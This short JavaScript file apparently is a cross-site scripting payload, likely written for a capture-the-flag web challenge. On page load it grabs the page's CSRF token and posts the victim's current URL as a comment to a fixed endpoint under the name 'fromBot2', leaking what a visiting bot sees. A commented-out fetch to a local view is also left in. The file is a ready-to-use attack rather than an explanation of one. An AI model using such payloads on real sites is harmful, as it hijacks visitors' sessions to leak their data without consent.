//fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
//	return res.text();
//}).then(data => {
window.onload = function () {
	var csrf = document.querySelector("[name=csrfmiddlewaretoken]").value;
	var formData = new FormData();

	formData.append("csrfmiddlewaretoken", csrf);
	formData.append("creator", "fromBot2");
	formData.append("body", window.location.href);

	fetch("/comment/0718f6ec-175e-448c-adfb-4c4bedfd2d0e",{
		method: 'POST',
		body: formData
	});
};

//})